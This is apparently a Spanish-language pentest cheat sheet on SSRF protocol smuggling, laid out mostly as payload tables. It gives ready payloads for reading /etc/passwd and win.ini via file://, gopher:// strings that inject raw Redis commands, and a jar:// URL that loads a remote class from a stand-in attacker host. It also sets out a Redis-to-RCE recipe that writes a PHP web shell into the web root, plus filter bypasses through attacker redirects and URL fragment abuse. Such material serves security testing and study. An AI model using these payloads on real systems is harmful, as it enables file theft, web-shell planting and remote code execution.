---
aliases:
  - SSRF Protocol Smuggling
  - Gopher SSRF
  - File Protocol SSRF
tags:
  - type/technique
  - vuln/ssrf
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[Server-Side Request Forgery (SSRF)]]'
---
# SSRF - Protocolos Alternativos

***

## Cheatsheet

|     **Protocolo**      |                       **Payload**                       | **Capacidad**                                        |
| :--------------------: | :-----------------------------------------------------: | ---------------------------------------------------- |
|     **`file://`**      |   `file:///etc/passwd`, `file:///C:/Windows/win.ini`    | Lectura arbitraria de archivos locales al backend.   |
|    **`gopher://`**     |     `gopher://127.0.0.1:6379/_%0d%0aSET%20x%20evil`     | Raw TCP — inyectar comandos Redis/SMTP/MySQL crudos. |
|     **`dict://`**      |             `dict://127.0.0.1:11211/stats`              | Enum servicios basados en texto (memcached, redis).  |
|      **`ftp://`**      |                   `ftp://127.0.0.1/`                    | Fetch desde FTP interno, credenciales en URL.        |
|     **`ldap://`**      |           `ldap://127.0.0.1:389/dc=internal`            | Bind / búsquedas LDAP internas.                      |
|     **`tftp://`**      |               `tftp://127.0.0.1:69/flag`                | UDP file retrieval.                                  |
|     **`sftp://`**      |            `sftp://user:pass@127.0.0.1/file`            | SFTP con creds si known.                             |
|  **`jar://`** (Java)   |                `jar:http://atk/x.jar!/`                 | Java-specific — carga clase remota.                  |
| **`netdoc://`** (Java) |                 `netdoc:///etc/passwd`                  | Fallback a file:// en Java.                          |
|   **`php://filter`**   | `php://filter/convert.base64-encode/resource=index.php` | Solo si backend es PHP con `allow_url_include`.      |
^ssrf-protocols

___

## Overview

Cuando la URL passada al backend se procesa con una lib HTTP genérica (curl, libcurl, java URLConnection, Python urllib), el atacante puede **smuggling de protocolo** — el parser acepta schemes distintos de `http(s)`, permitiendo interactuar con servicios que no hablan HTTP.

`gopher://` es el vector más potente — permite enviar bytes crudos a cualquier socket TCP. Combinado con Redis / memcached / MySQL sin auth en loopback = RCE.

### Mecanismos de Acción

- **`file://` wrapper**: Lectura directa del filesystem del servidor. Equivalente a LFI pero vía SSRF.
- **`gopher://` smuggling**: Payload `gopher://host:port/_<CRLF-encoded-data>` → el underscore separa host/port del buffer, resto va literal al socket. Permite construir requests HTTP, comandos Redis, SMTP DATA, MySQL packets.
  - Redis RCE clásico: `SET x "\n\n<?php system($_GET[0]);?>\n\n"` + `CONFIG SET dir /var/www/html` + `CONFIG SET dbfilename shell.php` + `SAVE`.
- **Java quirks**: `jar://` + `netdoc://` son legacy Java — deserialización y file read respectivamente. Útiles en apps Spring/Struts.
- **PHP streams**: Si curl/file_get_contents con `allow_url_fopen`, wrappers PHP (`php://`, `phar://`, `data://`) aplican igual que en LFI.

### Filtros comunes y bypass

| Filtro | Bypass |
|---|---|
| Scheme whitelist `http(s)` | Redirect 302 desde server atacante a `file://` / `gopher://` (sigue redirect, cambia scheme). |
| DNS-based blacklist | URL parsers distintos del DNS resolver — `http://attacker.com#@127.0.0.1/` (fragment abuse). |

***
